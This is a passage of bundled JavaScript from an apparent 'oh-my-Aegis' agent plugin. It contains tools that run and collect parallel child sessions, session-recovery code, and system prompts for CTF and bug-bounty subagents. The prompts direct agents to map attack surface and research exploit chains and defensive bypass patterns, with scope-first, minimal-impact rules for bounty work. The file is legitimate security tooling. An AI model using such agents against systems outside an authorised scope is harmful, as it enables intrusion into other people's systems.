              reason: "hypothesis plan requires at least one hypothesis in JSON array format",
              sessionID
            }, null, 2);
          }
          dispatchPlan = planHypothesisDispatch(state, config3, parsedHypotheses);
        }
        try {
          const group = await dispatchParallel(sessionClient, sessionID, projectDir, dispatchPlan, maxTracks, { parallel: config3.parallel, state });
          parallelBackgroundManager.ensurePolling();
          parallelBackgroundManager.pollOnce();
          return JSON.stringify({
            ok: true,
            sessionID,
            dispatched: group.tracks.length,
            group: groupSummary(group)
          }, null, 2);
        } catch (error92) {
          return JSON.stringify({
            ok: false,
            reason: `Dispatch error: ${error92 instanceof Error ? error92.message : String(error92)}`,
            sessionID
          }, null, 2);
        }
      }
    }),
    ctf_parallel_status: tool({
      description: "Check the status of active parallel child sessions. " + "Shows each track's purpose, agent, and current status (running/completed/failed/aborted).",
      args: {
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const groups = getGroups(sessionID);
        if (groups.length === 0) {
          return JSON.stringify({
            ok: true,
            sessionID,
            hasActiveGroup: false,
            totalGroups: 0,
            message: "No parallel groups dispatched for this session."
          }, null, 2);
        }
        const activeGroup = getActiveGroup(sessionID);
        return JSON.stringify({
          ok: true,
          sessionID,
          hasActiveGroup: Boolean(activeGroup),
          totalGroups: groups.length,
          activeGroup: activeGroup ? groupSummary(activeGroup) : null,
          completedGroups: groups.filter((g) => g.completedAt > 0).map(groupSummary)
        }, null, 2);
      }
    }),
    ctf_parallel_collect: tool({
      description: "Collect results from parallel child sessions. " + "Reads messages from each track and returns their last assistant output. " + "Optionally declare a winner to abort the rest.",
      args: {
        winner_session_id: schema4.string().optional(),
        winner_rationale: schema4.string().optional(),
        message_limit: schema4.number().int().min(1).max(20).optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const sessionClient = extractSessionClient(client);
        if (!sessionClient) {
          return JSON.stringify({
            ok: false,
            reason: "SDK session client not available",
            sessionID
          }, null, 2);
        }
        parallelBackgroundManager.bindSessionClient(sessionClient);
        await parallelBackgroundManager.pollOnce();
        const activeGroup = getActiveGroup(sessionID);
        if (!activeGroup) {
          const groups = getGroups(sessionID);
          if (groups.length === 0) {
            return JSON.stringify({
              ok: false,
              reason: "No parallel groups exist for this session.",
              sessionID
            }, null, 2);
          }
          const lastGroup = groups[groups.length - 1];
          return JSON.stringify({
            ok: true,
            sessionID,
            alreadyCompleted: true,
            group: groupSummary(lastGroup)
          }, null, 2);
        }
        const messageLimit = args.message_limit ?? 5;
        const collected = await collectResults(sessionClient, activeGroup, projectDir, messageLimit);
        if (args.winner_session_id) {
          const abortedCount = await abortAllExcept(sessionClient, activeGroup, args.winner_session_id, projectDir, args.winner_rationale);
          return JSON.stringify({
            ok: true,
            sessionID,
            winnerDeclared: args.winner_session_id,
            abortedTracks: abortedCount,
            group: groupSummary(activeGroup),
            results: collected.results.map((r) => ({
              sessionID: r.sessionID,
              purpose: r.purpose,
              agent: r.agent,
              status: r.status,
              resultPreview: r.lastAssistantMessage.slice(0, 500)
            })),
            merged: collected.merged,
            quarantinedSessionIDs: collected.quarantinedSessionIDs
          }, null, 2);
        }
        return JSON.stringify({
          ok: true,
          sessionID,
          group: groupSummary(activeGroup),
          results: collected.results.map((r) => ({
            sessionID: r.sessionID,
            purpose: r.purpose,
            agent: r.agent,
            status: r.status,
            resultPreview: r.lastAssistantMessage.slice(0, 500)
          })),
          merged: collected.merged,
          quarantinedSessionIDs: collected.quarantinedSessionIDs
        }, null, 2);
      }
    }),
    ctf_parallel_abort: tool({
      description: "Abort all running parallel child sessions. " + "Use when pivoting strategy or when a winner is found via ctf_parallel_collect.",
      args: {
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const sessionClient = extractSessionClient(client);
        if (!sessionClient) {
          return JSON.stringify({
            ok: false,
            reason: "SDK session client not available",
            sessionID
          }, null, 2);
        }
        const activeGroup = getActiveGroup(sessionID);
        if (!activeGroup) {
          return JSON.stringify({
            ok: true,
            sessionID,
            message: "No active parallel group to abort."
          }, null, 2);
        }
        const abortedCount = await abortAll(sessionClient, activeGroup, projectDir);
        return JSON.stringify({
          ok: true,
          sessionID,
          abortedTracks: abortedCount,
          group: groupSummary(activeGroup)
        }, null, 2);
      }
    })
  };
}

// src/orchestration/parallel-background.ts
var DEFAULT_POLL_INTERVAL_MS = 2000;
var DEFAULT_TRACK_TTL_MS = 30 * 60 * 1000;
var DEFAULT_MESSAGE_LIMIT = 20;
var hasError3 = hasErrorResponse;
function getGroupKey(group) {
  return `${group.parentSessionID}:${group.createdAt}:${group.label}`;
}
function extractStatusMap(statusResult) {
  if (!statusResult)
    return {};
  if (hasError3(statusResult))
    return {};
  if (isRecord(statusResult) && isRecord(statusResult.data)) {
    return statusResult.data;
  }
  if (isRecord(statusResult)) {
    return statusResult;
  }
  return {};
}
async function callSessionStatusMap(sessionClient, directory) {
  try {
    const primary = await sessionClient.status({ query: { directory } });
    return extractStatusMap(primary);
  } catch (error92) {}
  try {
    const fallback = await sessionClient.status({ directory });
    return extractStatusMap(fallback);
  } catch (error92) {}
  try {
    const last = await sessionClient.status();
    return extractStatusMap(last);
  } catch (error92) {
    return {};
  }
}
async function callSessionMessagesData2(sessionClient, sessionID, directory, limit) {
  try {
    const primary = await sessionClient.messages({
      path: { id: sessionID },
      query: { directory, limit }
    });
    if (!hasError3(primary) && Array.isArray(primary?.data))
      return primary.data;
  } catch (error92) {}
  try {
    const fallback = await sessionClient.messages({ sessionID, directory, limit });
    if (!hasError3(fallback) && Array.isArray(fallback?.data))
      return fallback.data;
  } catch (error92) {}
  return null;
}
function extractLastAssistantText(messages) {
  let lastAssistant = "";
  for (const msg of messages) {
    if (!isRecord(msg))
      continue;
    const role = typeof msg.role === "string" ? msg.role : isRecord(msg.info) && typeof msg.info.role === "string" ? String(msg.info.role) : "";
    if (role !== "assistant")
      continue;
    const parts = Array.isArray(msg.parts) ? msg.parts : [];
    const text = parts.map((p) => isRecord(p) && typeof p.text === "string" ? p.text : "").filter(Boolean).join(`
`);
    if (text)
      lastAssistant = text;
  }
  return lastAssistant;
}
function countGroupStatuses(group) {
  let completed = 0;
  let failed = 0;
  let aborted3 = 0;
  for (const t of group.tracks) {
    if (t.status === "completed")
      completed += 1;
    if (t.status === "failed")
      failed += 1;
    if (t.status === "aborted")
      aborted3 += 1;
  }
  return { completed, failed, aborted: aborted3, total: group.tracks.length + group.queue.length };
}
function hasRunningTracks(group) {
  if (group.queue.length > 0)
    return true;
  return group.tracks.some((t) => t.status === "running" || t.status === "pending");
}
function isGroupDone(group) {
  if (group.queue.length > 0)
    return false;
  return group.tracks.every((t) => t.status === "completed" || t.status === "failed" || t.status === "aborted");
}

class ParallelBackgroundManager {
  params;
  sessionClient = null;
  pollingInterval;
  pollInFlight = false;
  notifiedGroupKeys = new Set;
  constructor(params) {
    this.params = params;
  }
  bindSessionClient(sessionClient) {
    this.sessionClient = sessionClient;
  }
  ensurePolling() {
    if (!this.sessionClient)
      return;
    if (this.pollingInterval)
      return;
    if (!this.hasAnyRunningTracks())
      return;
    const intervalMs = this.params.pollIntervalMs ?? DEFAULT_POLL_INTERVAL_MS;
    this.pollingInterval = setInterval(() => {
      this.pollOnce();
    }, intervalMs);
    this.pollingInterval?.unref?.();
  }
  stopPolling() {
    if (!this.pollingInterval)
      return;
    clearInterval(this.pollingInterval);
    this.pollingInterval = undefined;
  }
  handleEvent(type, props) {
    if (!type)
      return;
    if (!this.sessionClient)
      return;
    if (type === "session.idle") {
      const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
      if (sessionID) {
        this.pollOnce();
      }
    }
    if (type === "session.status") {
      const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
      const status = props.status;
      if (sessionID && status?.type === "idle") {
        this.pollOnce();
      }
    }
    if (type === "session.deleted") {
      const info = props.info;
      const deletedID = isRecord(info) && typeof info.id === "string" ? info.id : "";
      if (!deletedID)
        return;
      this.markSessionDeleted(deletedID);
      this.pollOnce();
    }
  }
  markSessionDeleted(sessionID) {
    const now = Date.now();
    let changed = false;
    for (const groups of getAllGroups().values()) {
      for (const group of groups) {
        for (const track of group.tracks) {
          if (track.sessionID !== sessionID)
            continue;
          if (track.status === "completed" || track.status === "failed" || track.status === "aborted") {
            continue;
          }
          track.status = "aborted";
          track.result = track.result || "Session deleted";
          track.completedAt = now;
          changed = true;
        }
        if (group.completedAt === 0 && isGroupDone(group)) {
          group.completedAt = now;
          changed = true;
        }
      }
    }
    if (changed) {
      persistParallelGroupsDeferred();
    }
  }
  async pollOnce() {
    if (!this.sessionClient)
      return;
    if (this.pollInFlight)
      return;
    this.pollInFlight = true;
    try {
      await this.pollOnceInner(this.sessionClient);
    } finally {
      this.pollInFlight = false;
    }
  }
  hasAnyRunningTracks() {
    for (const groups of getAllGroups().values()) {
      for (const g of groups) {
        if (g.completedAt > 0)
          continue;
        if (hasRunningTracks(g))
          return true;
      }
    }
    return false;
  }
  pruneStaleTracks(now) {
    const ttlMs = this.params.trackTtlMs ?? DEFAULT_TRACK_TTL_MS;
    let changed = false;
    for (const groups of getAllGroups().values()) {
      for (const group of groups) {
        for (const track of group.tracks) {
          if (track.status !== "running" && track.status !== "pending")
            continue;
          const age = now - track.createdAt;
          if (age <= ttlMs)
            continue;
          track.status = "failed";
          track.result = track.result || "Timed out while running parallel track";
          track.completedAt = now;
          changed = true;
        }
        if (group.completedAt === 0 && isGroupDone(group)) {
          group.completedAt = now;
          changed = true;
        }
      }
    }
    if (changed) {
      persistParallelGroupsDeferred();
    }
  }
  async pollOnceInner(sessionClient) {
    const now = Date.now();
    this.pruneStaleTracks(now);
    if (!this.hasAnyRunningTracks()) {
      this.stopPolling();
      return;
    }
    const directory = this.params.directory;
    const statusMap = await callSessionStatusMap(sessionClient, directory);
    const idleSessionIDs = new Set;
    for (const groups of getAllGroups().values()) {
      for (const group of groups) {
        if (group.completedAt > 0)
          continue;
        for (const track of group.tracks) {
          if (!track.sessionID)
            continue;
          if (track.status !== "running" && track.status !== "pending")
            continue;
          const status = statusMap[track.sessionID];
          if (status?.type === "idle") {
            idleSessionIDs.add(track.sessionID);
          }
        }
      }
    }
    const activeGroups = [];
    for (const groups of getAllGroups().values()) {
      for (const group of groups) {
        if (group.completedAt > 0)
          continue;
        activeGroups.push(group);
      }
    }
    await Promise.all(activeGroups.map(async (group) => {
      await this.updateGroupFromIdle(sessionClient, group, idleSessionIDs);
      await dispatchQueuedTracks(sessionClient, group, directory);
      if (group.completedAt === 0 && isGroupDone(group)) {
        group.completedAt = Date.now();
      }
      if (group.completedAt > 0) {
        await this.notifyGroupCompleted(group);
      }
    }));
    persistParallelGroupsDeferred();
    if (!this.hasAnyRunningTracks()) {
      this.stopPolling();
    }
  }
  async updateGroupFromIdle(sessionClient, group, idleSessionIDs) {
    const directory = this.params.directory;
    for (const track of group.tracks) {
      if (!track.sessionID)
        continue;
      if (track.status !== "running" && track.status !== "pending")
        continue;
      if (!idleSessionIDs.has(track.sessionID))
        continue;
      try {
        const data = await callSessionMessagesData2(sessionClient, track.sessionID, directory, DEFAULT_MESSAGE_LIMIT);
        const lastAssistant = Array.isArray(data) ? extractLastAssistantText(data) : "";
        if (lastAssistant) {
          track.result = lastAssistant.slice(0, 2000);
          track.status = "completed";
          track.completedAt = Date.now();
        } else {
          track.result = track.result || "(idle; no assistant text message found)";
          track.status = "completed";
          track.completedAt = Date.now();
        }
      } catch (error92) {
        track.status = "failed";
        track.result = `Collection error: ${error92 instanceof Error ? error92.message : String(error92)}`;
        track.completedAt = Date.now();
      }
    }
  }
  async notifyGroupCompleted(group) {
    const key = getGroupKey(group);
    if (this.notifiedGroupKeys.has(key))
      return;
    this.notifiedGroupKeys.add(key);
    const counts = countGroupStatuses(group);
    const title = "oh-my-Aegis: parallel complete";
    const message = `${group.label} (${counts.completed} ok, ${counts.failed} fail, ${counts.aborted} aborted). Use ctf_parallel_collect.`;
    const text = [
      "[oh-my-Aegis parallel]",
      `group=${group.label}`,
      `tracks=${counts.total} completed=${counts.completed} failed=${counts.failed} aborted=${counts.aborted}`,
      "Next:",
      "- ctf_parallel_collect message_limit=5"
    ].join(`
`);
    await this.maybeShowToast(title, message, "success");
    await this.maybePromptParent(group.parentSessionID, text);
  }
  async maybeShowToast(title, message, variant) {
    if (!this.params.config.tui_notifications.enabled)
      return;
    const toastFn = this.params.client?.tui?.showToast;
    if (typeof toastFn !== "function")
      return;
    const duration5 = 5000;
    try {
      await toastFn({
        directory: this.params.directory,
        title,
        message,
        variant,
        duration: duration5
      });
      return;
    } catch (error92) {}
    try {
      await toastFn({
        query: { directory: this.params.directory },
        body: {
          title,
          message,
          variant,
          duration: duration5
        }
      });
    } catch (error92) {}
  }
  async maybePromptParent(sessionID, text) {
    const session = this.params.client?.session;
    const promptAsync = session?.promptAsync;
    if (typeof promptAsync !== "function")
      return;
    const parts = [
      {
        type: "text",
        text,
        synthetic: true,
        metadata: {
          source: "oh-my-Aegis.parallel"
        }
      }
    ];
    try {
      await promptAsync({
        path: { id: sessionID },
        query: { directory: this.params.directory },
        body: { parts }
      });
      return;
    } catch (error92) {}
    try {
      await promptAsync({
        sessionID,
        directory: this.params.directory,
        parts
      });
    } catch (error92) {}
  }
}

// src/agents/aegis-orchestrator.ts
var DEFAULT_MODEL = "openai/gpt-5.3-codex";
var AEGIS_ORCHESTRATOR_PROMPT = `You are "Aegis" \u2014 a CTF/BOUNTY orchestrator.

You optimize for:
- CTF: speed + verified end-to-end correctness (decoy-resistant)
- BOUNTY: scope-first + minimal-impact validation (safety-first)

Communication:
- Reply in Korean by default (unless user asks otherwise).
- Be concise and evidence-driven.

Operating loop (always):
1) Read current orchestrator state via ctf_orch_status.
2) Decide next action. Prefer the recommended route from ctf_orch_next unless you have a better reason.
3) Delegate the work:
   - PLAN => aegis-plan (planning only)
   - EXECUTE => aegis-exec (execute from a short plan-backed TODO list)
   - Hard REV/PWN pivots => aegis-deep (deep worker)
4) Record state via ctf_orch_event when you discover new evidence/candidate/verification outcome.

CTF policy:
- Follow SCAN -> PLAN -> EXECUTE.
- If SCAN phase and no active parallel group exists: dispatch parallel scans.
  - Use ctf_parallel_dispatch plan=scan with the challenge description.
  - While tracks run, do not block; collect results later with ctf_parallel_collect.
- When planning is ready: call ctf_orch_event event=plan_completed (aegis-plan should do this).
- If verification fails (Wrong!/Fail): treat prior output as DECOY candidate and pivot. Do NOT spend time debugging mismatch.
- If stuck triggers: pivot to the stuck route (ctf-research / target-specific stuck agent), and run ONE cheapest disconfirm test.

BOUNTY policy:
- Never do active testing until scope is confirmed.
- Default to read-only / minimal impact checks.
- Avoid broad scanning, fuzzing, brute forcing.
- If 2 read-only attempts are inconclusive: escalate to bounty-research and propose ONE scope-safe validation.

Parallel orchestration:
- Use ctf_parallel_dispatch for SCAN (and hypothesis testing when you have 2-3 hypotheses).
- Use ctf_parallel_status to see running tracks.
- Use ctf_parallel_collect to merge results.
- If a clear winner exists: declare it and abort the rest (winner_session_id).

[search-mode] delegation policy (strict):
- If the latest user message contains [search-mode], immediately run delegation-first fan-out.
- Always include ctf_parallel_dispatch plan=scan (local fan-out).
- Always include ctf_subagent_dispatch with type=librarian for external references.
- Skip extra explore dispatch only when target is CTF and the parallel scan plan already includes a ctf-explore track.
- After dispatch, run ctf_parallel_collect message_limit=5 and select a winner when evidence is clear.
- Keep manager role strict: do not call read/grep/bash directly; delegate and synthesize.

Delegation-first contract (critical):
- You are an orchestrator, not an executor. Delegate domain work to subagents.
- Do NOT do substantive domain analysis with direct grep/read/bash when a subagent can do it.
- Use orchestration tools first: ctf_orch_status/next/event + ctf_parallel_dispatch/status/collect.
- If needed, pin subagent execution profile via ctf_orch_set_subagent_profile (model + variant).
- Keep long outputs out of chat: redirect to files when possible.
- Do not use direct execution tools yourself. Keep manager role strict and delegate.
`;
function createAegisOrchestratorAgent(model = DEFAULT_MODEL) {
  return {
    description: "Aegis - CTF/BOUNTY orchestrator. Runs SCAN/PLAN/EXECUTE, dispatches parallel child sessions, enforces bounty safety, and pivots fast on verification mismatch.",
    mode: "primary",
    model,
    prompt: AEGIS_ORCHESTRATOR_PROMPT,
    color: "#1F6FEB",
    maxSteps: 24,
    permission: {
      edit: "deny",
      bash: "deny",
      webfetch: "deny",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}
var aegisOrchestratorAgent = createAegisOrchestratorAgent();

// src/agents/aegis-plan.ts
var DEFAULT_MODEL2 = "openai/gpt-5.3-codex";
var AEGIS_PLAN_PROMPT = `You are "Aegis Plan" \u2014 a planning subagent for CTF/BOUNTY.

Core job:
- Do interview-driven planning, then hand off execution to aegis-exec.
- You produce a concrete plan + cheapest disconfirm tests.

Rules:
- Planning-only: do NOT run bash, do NOT edit/write files.
- Always start by calling ctf_orch_status to read MODE/PHASE/TARGET and current counters.
- If context is missing (no challenge description, no artifacts, no scan notes): ask up to 3 targeted questions.
- Output must be structured and ready for execution.
- Reply in Korean by default.

Output format (Markdown):
1) 3-6 Observations (facts only)
2) Leading Hypothesis (LH) + why
3) Alternatives (2-4)
4) Cheapest disconfirm tests (1 per hypothesis)
5) Execution plan (2-6 steps)
6) TODO plan (2-8 items recommended, multiple pending allowed, one in_progress)
7) Verification plan (how to confirm Correct/Fail)

State updates:
- When you choose LH/alternatives, call ctf_orch_event to set hypothesis/alternatives.
- When your plan is ready, call ctf_orch_event event=plan_completed.

CTF specifics:
- Prefer disconfirm-first; stop-loss: if verifier says Wrong/Fail, pivot immediately.

BOUNTY specifics:
- If scope is not confirmed, do not propose active testing; route to bounty-scope discipline.
- Your plan must be minimal-impact and explicitly list what is safe to do in-scope.
`;
function createAegisPlanAgent(model = DEFAULT_MODEL2) {
  return {
    description: "Aegis Plan - planner. Produces interview-driven plans + cheapest disconfirm tests, then hands off to aegis-exec.",
    mode: "subagent",
    hidden: true,
    model,
    prompt: AEGIS_PLAN_PROMPT,
    color: "#EAB308",
    maxSteps: 16,
    permission: {
      edit: "deny",
      bash: "deny",
      webfetch: "allow",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}
var aegisPlanAgent = createAegisPlanAgent();

// src/agents/aegis-exec.ts
var DEFAULT_MODEL3 = "openai/gpt-5.3-codex";
var AEGIS_EXEC_PROMPT = `You are "Aegis Exec" \u2014 an execution subagent for CTF/BOUNTY.

Core job:
- Execute ONE focused TODO loop from the current plan.
- Delegate domain work explicitly via task(subagent_type=...).
  - CTF: ctf-web/ctf-web3/ctf-pwn/ctf-rev/ctf-crypto/ctf-explore/ctf-solve
  - BOUNTY: bounty-triage/bounty-research (scope gating is handled by bounty-scope)

Rules:
- Always start by calling ctf_orch_status.
- If available, read the durable plan in .Aegis/PLAN.md.
- Execute exactly ONE TODO and stop.
- Do NOT call task() without an explicit subagent_type; otherwise you may route back to aegis-exec.
- Record state via ctf_orch_event when you discover new evidence / candidate / verification outcome.
- Reply in Korean by default.

CTF specifics:
- If you produce a candidate, call ctf_orch_event event=candidate_found candidate="...".
- Verification mismatch (Wrong/Fail) => treat as decoy candidate and pivot; do NOT debug mismatch.

BOUNTY specifics:
- Never do active testing before scope is confirmed.
- Prefer minimal-impact validation; if unsure, delegate to bounty-triage.
`;
function createAegisExecAgent(model = DEFAULT_MODEL3) {
  return {
    description: "Aegis Exec - executor. Executes from a short plan-backed TODO list, delegates domain work, records evidence, and stops.",
    mode: "subagent",
    hidden: true,
    model,
    prompt: AEGIS_EXEC_PROMPT,
    color: "#22C55E",
    maxSteps: 24,
    permission: {
      edit: "ask",
      bash: "allow",
      webfetch: "allow",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}
var aegisExecAgent = createAegisExecAgent();

// src/agents/aegis-deep.ts
var DEFAULT_MODEL4 = "openai/gpt-5.3-codex";
var AEGIS_DEEP_PROMPT = `You are "Aegis Deep" \u2014 an autonomous deep worker for hard CTF/BOUNTY targets (especially REV/PWN).

Core job:
- Given a goal, dispatch 2-5 parallel exploration tracks.
- Merge results, pick the best next move, and propose a flexible TODO set.

Rules:
- Always start by calling ctf_orch_status.
- Use ctf_parallel_dispatch plan=deep_worker with a clear goal (or challenge description) and max_tracks.
- While tracks run: do not block; use ctf_parallel_status then ctf_parallel_collect.
- If a clear winner exists: abort others via winner_session_id.
- After synthesis: either (a) dispatch aegis-exec with a concrete next TODO, or (b) return the next TODO + evidence needs.
- After synthesis: either (a) dispatch aegis-exec with a concrete TODO set, or (b) return the next TODO set + evidence needs.
- Reply in Korean by default.

Safety:
- BOUNTY: do not do active testing before scope is confirmed.
- In BOUNTY mode, deep_worker plan will use bounty-triage/bounty-research tracks.
`;
function createAegisDeepAgent(model = DEFAULT_MODEL4) {
  return {
    description: "Aegis Deep - deep worker. Dispatches parallel tracks, merges results, and outputs the next TODO set.",
    mode: "subagent",
    hidden: true,
    model,
    prompt: AEGIS_DEEP_PROMPT,
    color: "#F97316",
    maxSteps: 28,
    permission: {
      edit: "ask",
      bash: "allow",
      webfetch: "allow",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}
var aegisDeepAgent = createAegisDeepAgent();

// src/agents/aegis-explore.ts
var AEGIS_EXPLORE_SYSTEM_PROMPT = `You are "Aegis-Explore" \u2014 a lightweight contextual grep subagent for CTF/BOUNTY analysis.

Mission:
- Perform fast, targeted search and pattern discovery on challenge files, binaries, and codebases.
- Focus on attack surface identification and vulnerability pattern discovery.
- Support both CTF (challenge artifact analysis) and BOUNTY (codebase security review) modes.

Allowed workflow:
- Use grep, glob, read, and ast_grep_search for deterministic discovery.
- Prioritize high-signal locations first: entry points, handlers/controllers, auth/session logic, parsers, deserialization, command execution, file access, crypto usage, and unsafe sinks.
- Trace suspicious patterns to concrete file and line references.

Hard constraints:
- Never attempt to solve, exploit, or patch. Observe and report only.
- Keep output to at most 20 lines.
- Use bullet points only.
- Every bullet must include file:line references when available.

Output format:
- "- <file>:<line> - <observation>"
- Include concrete findings only: discovered surface, risky patterns, weak validation points, suspicious constants/flows, and likely vulnerability classes.`;
function createAegisExploreAgent() {
  return {
    mode: "subagent",
    hidden: true,
    systemPrompt: AEGIS_EXPLORE_SYSTEM_PROMPT,
    permission: {
      edit: "deny",
      bash: "deny",
      webfetch: "deny",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}

// src/agents/aegis-librarian.ts
var AEGIS_LIBRARIAN_SYSTEM_PROMPT = `You are "Aegis-Librarian" \u2014 an external reference research subagent for CTF/BOUNTY.

Mission:
- Search external security references: official docs, CVE databases, GitHub repositories, and writeups.
- Focus on exploitation techniques, known vulnerabilities, and similar challenge or real-world patterns.
- Support security-focused research for CVEs, exploit chains, framework/library weaknesses, and defensive bypass patterns.

Tooling:
- Use websearch_web_search_exa for broad discovery.
- Use context7 for official framework/library documentation.
- Use grep_app_searchGitHub for real OSS implementation patterns and exploit-adjacent code examples.

Output contract:
- Return 3-5 highly relevant references only.
- Always cite sources with URLs.
- For each reference, include title, URL, and a 1-2 line applicability summary tied to the current query.
- Prioritize source quality and recency.

Format:
1. <Title>
   - URL: <https://...>
   - Relevance: <1-2 lines>

If evidence quality is weak, explicitly say what is missing and which source type to search next.`;
function createAegisLibrarianAgent() {
  return {
    mode: "subagent",
    hidden: true,
    systemPrompt: AEGIS_LIBRARIAN_SYSTEM_PROMPT,
    permission: {
      edit: "deny",
      bash: "deny",
      webfetch: "allow",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}

// src/recovery/error-utils.ts
function extractErrorMessage(error92) {
  if (!error92)
    return "";
  if (typeof error92 === "string")
    return error92;
  if (error92 instanceof Error) {
    return error92.message || String(error92);
  }
  if (isRecord(error92)) {
    const candidates = [
      error92,
      error92.error,
      error92.data,
      isRecord(error92.data) ? error92.data.error : null
    ];
    for (const item of candidates) {
      if (!item)
        continue;
      if (typeof item === "string" && item.trim().length > 0) {
        return item;
      }
      if (item instanceof Error) {
        return item.message || String(item);
      }
      if (isRecord(item)) {
        const msg = item.message;
        if (typeof msg === "string" && msg.trim().length > 0) {
          return msg;
        }
        const text = item.text;
        if (typeof text === "string" && text.trim().length > 0) {
          return text;
        }
      }
    }
  }
  try {
    return JSON.stringify(error92);
  } catch {
    return String(error92);
  }
}

// src/recovery/session-recovery.ts
init_debug_log();
var hasError4 = hasErrorResponse;
function detectSessionRecoveryErrorType(error92) {
  const message = extractErrorMessage(error92).toLowerCase();
  if (!message)
    return null;
  if (message.includes("assistant message prefill") || message.includes("conversation must end with a user message")) {
    return "assistant_prefill_unsupported";
  }
  if (message.includes("thinking is disabled") && message.includes("cannot contain")) {
    return "thinking_disabled_violation";
  }
  if (message.includes("thinking") && (message.includes("first block") || message.includes("must start with") || message.includes("preced") || message.includes("final block") || message.includes("cannot be thinking") || message.includes("expected") && message.includes("found"))) {
    return "thinking_block_order";
  }
  if (message.includes("tool_use") && message.includes("tool_result")) {
    return "tool_result_missing";
  }
  return null;
}
async function showToast(params) {
  const tui = isRecord(params.client) ? params.client.tui : null;
  const toastFn = isRecord(tui) ? tui.showToast : null;
  if (typeof toastFn !== "function")
    return;
  const title = params.title.slice(0, 80);
  const message = params.message.slice(0, 240);
  const duration5 = 3000;
  try {
    await toastFn({
      directory: params.directory,
      title,
      message,
      variant: params.variant,
      duration: duration5
    });
    return;
  } catch (error92) {
    debugLog("session-recovery", "showToast primary call failed", error92);
  }
  try {
    await toastFn({
      query: { directory: params.directory },
      body: { title, message, variant: params.variant, duration: duration5 }
    });
  } catch (error92) {
    debugLog("session-recovery", "showToast fallback call failed", error92);
  }
}
async function callSessionAbort2(sessionClient, sessionID, directory) {
  try {
    const primary = await sessionClient.abort({ path: { id: sessionID }, query: { directory } });
    if (!hasError4(primary))
      return;
  } catch (error92) {
    debugLog("session-recovery", `abort primary failed session=${sessionID}`, error92);
  }
  try {
    await sessionClient.abort({ sessionID, directory });
  } catch (error92) {
    debugLog("session-recovery", `abort fallback failed session=${sessionID}`, error92);
  }
}
async function callSessionMessages(sessionClient, sessionID, directory, limit) {
  try {
    const primary = await sessionClient.messages({
      path: { id: sessionID },
      query: { directory, limit }
    });
    if (!hasError4(primary) && Array.isArray(primary.data)) {
      return primary.data;
    }
  } catch (error92) {
    debugLog("session-recovery", `messages primary failed session=${sessionID}`, error92);
  }
  try {
    const fallback = await sessionClient.messages({ sessionID, directory, limit });
    if (!hasError4(fallback) && Array.isArray(fallback.data)) {
      return fallback.data;
    }
  } catch (error92) {
    debugLog("session-recovery", `messages fallback failed session=${sessionID}`, error92);
  }
  return null;
}
async function callSessionPromptParts(sessionClient, sessionID, directory, parts) {
  try {
    const primary = await sessionClient.promptAsync({
      path: { id: sessionID },
      query: { directory },
      body: { parts }
    });
    if (!hasError4(primary))
      return true;
  } catch (error92) {
    debugLog("session-recovery", `promptParts primary failed session=${sessionID}`, error92);
  }
  try {
    const fallback = await sessionClient.promptAsync({ sessionID, directory, parts });
    return !hasError4(fallback);
  } catch (error92) {
    debugLog("session-recovery", `promptParts fallback failed session=${sessionID}`, error92);
    return false;
  }
}
function findMessageById(messages, messageID) {
  for (const msg of messages) {
    if (!isRecord(msg))
      continue;
    const info = isRecord(msg.info) ? msg.info : null;
    const topId = typeof msg.id === "string" ? msg.id : "";
    const infoId = info && typeof info.id === "string" ? String(info.id) : "";
    const id = infoId || topId;
    if (!id || id !== messageID)
      continue;
    const parts = Array.isArray(msg.parts) ? msg.parts : [];
    return { info: info ?? {}, parts };
  }
  return null;
}
function extractToolUses(parts) {
  const uses = [];
  for (const part of parts) {
    if (!isRecord(part))
      continue;
    const type = typeof part.type === "string" ? part.type : "";
    if (type !== "tool_use" && type !== "tool")
      continue;
    const id = typeof part.id === "string" ? part.id : typeof part.callID === "string" ? part.callID : "";
    if (!id)
      continue;
    const name = typeof part.name === "string" ? part.name : "";
    uses.push({ id, name });
  }
  const seen = new Set;
  const deduped = [];
  for (const u of uses) {
    if (seen.has(u.id))
      continue;
    seen.add(u.id);
    deduped.push(u);
  }
  return deduped;
}
function extractMessageInfoFromUpdatedEvent(props) {
  const info = isRecord(props.info) ? props.info : null;
  if (!info)
    return null;
  const role = typeof info.role === "string" ? info.role : "";
  const sessionID = typeof info.sessionID === "string" ? info.sessionID : "";
  const messageID = typeof info.id === "string" ? info.id : "";
  const error92 = info.error;
  if (!sessionID || !messageID || !role || !error92)
    return null;
  return { sessionID, messageID, role, error: error92 };
}
function createSessionRecoveryManager(params) {
  const sessionClient = extractSessionClient(params.client);
  const processingByMessageID = new Set;
  const isRecoverableError = (error92) => {
    return detectSessionRecoveryErrorType(error92) !== null;
  };
  const handleEvent = async (type, props) => {
    if (!params.config.recovery.enabled || !params.config.recovery.session_recovery) {
      return;
    }
    if (!sessionClient) {
      return;
    }
    if (type !== "message.updated") {
      return;
    }
    const info = extractMessageInfoFromUpdatedEvent(props);
    if (!info) {
      return;
    }
    if (info.role !== "assistant") {
      return;
    }
    const errorType = detectSessionRecoveryErrorType(info.error);
    if (!errorType) {
      return;
    }
    if (processingByMessageID.has(info.messageID)) {
      return;
    }
    processingByMessageID.add(info.messageID);
    try {
      const state = params.store.get(info.sessionID);
      const summary = extractErrorMessage(info.error).replace(/\s+/g, " ").trim().slice(0, 240);
      const routeName = state.lastTaskCategory || "session-recovery";
      params.store.recordFailure(info.sessionID, "environment", routeName, `${errorType}: ${summary}`);
      await showToast({
        client: params.client,
        directory: params.directory,
        title: "oh-my-Aegis: session recovery",
        message: `Recovering from ${errorType}...`,
        variant: "warning"
      });
      await callSessionAbort2(sessionClient, info.sessionID, params.directory);
      const messages = await callSessionMessages(sessionClient, info.sessionID, params.directory, 200);
      if (!messages) {
